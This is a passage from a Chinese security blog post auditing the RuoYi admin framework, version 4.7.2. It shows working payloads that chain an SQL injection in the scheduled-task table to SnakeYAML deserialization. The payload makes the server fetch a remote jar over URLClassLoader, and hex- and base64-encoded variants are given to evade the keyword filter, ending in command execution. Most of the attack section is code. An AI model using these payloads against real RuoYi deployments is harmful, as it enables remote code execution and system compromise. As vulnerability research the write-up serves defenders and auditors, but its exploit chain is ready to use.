+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.yaml</span><span class="hljs-selector-class">.snakeyaml</span><span class="hljs-selector-class">.Yaml</span><span class="hljs-selector-class">.load</span>(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;ht&#x27;</span>tp:<span class="hljs-comment">//127.0.0.1:8000/yaml-payload.jar&quot;]]]]&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-7-2"><a href="#4-7-2" class="headerlink" title="4.7.2"></a>4.7.2</h4><p>在此版本中，对调用目标字符串进行了严格校验，如下图</p>
+<p><img src="/image/ruoyi/image-20240919224202010.png" srcset="/img/loading.gif" lazyload alt="image-20240919224202010"> </p>
+<p><img src="/image/ruoyi/image-20240919224127786.png" srcset="/img/loading.gif" lazyload alt="image-20240919224127786"> </p>
+<p>但是，此处只是对新增和编辑的计划任务进行过滤，并没有在执行时进行拦截</p>
+<p>所以可以通过先前的sql注入漏洞，修改计划任务的数据库，实现新增一个计划任务的结果</p>
+<h5 id="具体步骤如下"><a href="#具体步骤如下" class="headerlink" title="具体步骤如下"></a>具体步骤如下</h5><p>首先随意创建一个计划任务</p>
+<img src="/image/ruoyi/image-20240919224919597.png" srcset="/img/loading.gif" lazyload alt="image-20240919224919597" style="zoom:67%;" /> 
+
+<p>接下来使用sql注入漏洞将<code>invoke_target</code>修改为payload即可</p>
+<p><img src="/image/ruoyi/image-20240919225004351.png" srcset="/img/loading.gif" lazyload alt="image-20240919225004351"> </p>
+<p>此版本只剩下一个sql注入漏洞–createTable</p>
+<p> 但是按照上面的方式直接使用接口的话会受到constructor的限制，如下图</p>
+<p><img src="/image/ruoyi/image-20240921201833958.png" srcset="/img/loading.gif" lazyload alt="image-20240921201833958"></p>
+<p>此处会导致无法使用update方法，导致抛出异常</p>
+<p>解决方法如下：</p>
+<p>直接使用定时任务的功能，调用<code>genTableServiceImpl.createTable </code></p>
+<p>构造的定时任务如下</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = org.yaml.snakeyaml.Yaml.load(&#x27;</span>!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [<span class="hljs-string">&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;</span>]]]]<span class="hljs-string">&#x27;) &#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>但此时payload中会的关键字会被识别拦截，使用十六进制绕过</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">genTableServiceImpl.createTable<span class="hljs-punctuation">(</span>&#x27;UPDATE sys_job SET invoke_target = 0x6F<span class="hljs-number">7267</span>2E<span class="hljs-number">7961</span>6D6C2E736E616B<span class="hljs-number">657961</span>6D6C2E<span class="hljs-number">5961</span>6D6C2E6C6F<span class="hljs-number">616428272121</span>6A<span class="hljs-number">61766178</span>2E<span class="hljs-number">736372697074</span>2E<span class="hljs-number">53637269707445</span>6E<span class="hljs-number">6769</span>6E654D616E<span class="hljs-number">6167657220</span>5B<span class="hljs-number">2121</span>6A<span class="hljs-number">617661</span>2E6E<span class="hljs-number">6574</span>2E<span class="hljs-number">5552</span>4C436C<span class="hljs-number">617373</span>4C6F<span class="hljs-number">6164657220</span>5B5B<span class="hljs-number">2121</span>6A<span class="hljs-number">617661</span>2E6E<span class="hljs-number">6574</span>2E<span class="hljs-number">5552</span>4C205B<span class="hljs-number">2268747470</span>3A2F2F<span class="hljs-number">313237</span>2E302E302E313A<span class="hljs-number">38303030</span>2F<span class="hljs-number">7961</span>6D6C2D<span class="hljs-number">706179</span>6C6F<span class="hljs-number">6164</span>2E6A<span class="hljs-number">617222</span>5D5D5D5D<span class="hljs-number">272920</span> where job_id = 2&#x27;<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+<p>base64 绕过</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">genTableServiceImpl.createTable(&#x27;<span class="hljs-keyword">UPDATE</span> sys_job <span class="hljs-keyword">SET</span> invoke_target = from_base64(<span class="hljs-string">&quot;b3JnLnlhbWwuc25ha2V5YW1sLllhbWwubG9hZCgnISFqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciBbISFqYXZhLm5ldC5VUkxDbGFzc0xvYWRlciBbWyEhamF2YS5uZXQuVVJMIFsiaHR0cDovLzEyNy4wLjAuMTo4MDAwL3lhbWwtcGF5bG9hZC5qYXIiXV1dXScp&quot;</span>) <span class="hljs-keyword">where</span> job_id = <span class="hljs-number">3</span><span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/ruoyi/image-20240921203525989.png" srcset="/img/loading.gif" lazyload alt="image-20240921203525989"> </p>
+<p>执行后job3 已经变为 payload，可以正常命令执行</p>
+<p><img src="/image/ruoyi/image-20240921204045892.png" srcset="/img/loading.gif" lazyload alt="image-20240921204045892"> </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ruoyi代码审计</div>
+      <div>https://ggji13123.github.io/2024/09/21/ruoyi代码审计/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/28/shiro/" title="shiro 反序列化">
+                        <span class="hidden-mobile">shiro 反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
